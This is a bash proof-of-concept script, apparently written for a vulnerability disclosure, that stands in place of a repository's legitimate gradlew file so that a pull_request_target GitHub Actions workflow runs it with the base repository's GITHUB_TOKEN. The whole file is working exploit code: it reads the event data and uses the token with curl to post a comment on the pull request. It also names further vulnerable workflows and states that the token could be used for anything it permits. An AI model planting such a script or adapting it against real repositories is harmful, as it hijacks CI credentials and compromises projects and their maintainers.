#!/usr/bin/env bash
# PoC payload: this file replaces the legitimate gradlew. When pull_request_target
# runs `./gradlew detekt`, this script executes with the workflow's GITHUB_TOKEN.
# It uses that token to post a comment on the very PR that introduced it.

set -e

echo "[pwn] Running as: $(whoami)"
echo "[pwn] GITHUB_REPOSITORY=$GITHUB_REPOSITORY"
echo "[pwn] GITHUB_EVENT_NAME=$GITHUB_EVENT_NAME"
echo "[pwn] Token present: $([ -n "$GITHUB_TOKEN" ] && echo yes || echo no)"

PR_NUMBER=$(jq -r '.pull_request.number' "$GITHUB_EVENT_PATH")
echo "[pwn] PR_NUMBER=$PR_NUMBER"

BODY=$(cat <<EOF
:rotating_light: **pull_request_target PoC** :rotating_light:

This comment was posted by the \`detekt.yml\` workflow itself, using the base repo's \`GITHUB_TOKEN\`, as a direct result of arbitrary code in this PR's \`gradlew\` script.

- Workflow: \`.github/workflows/detekt.yml\`
- Trigger: \`pull_request_target\` (runs PR code with base-repo secrets)
- Vector: workflow checks out PR head, then runs \`./gradlew detekt\` — \`gradlew\` is attacker-controlled in the PR.
- Token scope used: \`pull-requests: write\`. The full \`GITHUB_TOKEN\` is exposed to this script and could be used for anything the token is permitted to do.

Same vulnerability exists in: \`.github/workflows/merge-conflicts.yml\`, \`.github/workflows/pr-quality.yml\`.
EOF
)

JSON=$(jq -n --arg body "$BODY" '{body: $body}')

curl -sS -X POST \
  -H "Authorization: Bearer $GITHUB_TOKEN" \
  -H "Accept: application/vnd.github+json" \
  "https://api.github.com/repos/$GITHUB_REPOSITORY/issues/$PR_NUMBER/comments" \
  -d "$JSON"

echo "[pwn] Comment posted. Exiting 0."
exit 0
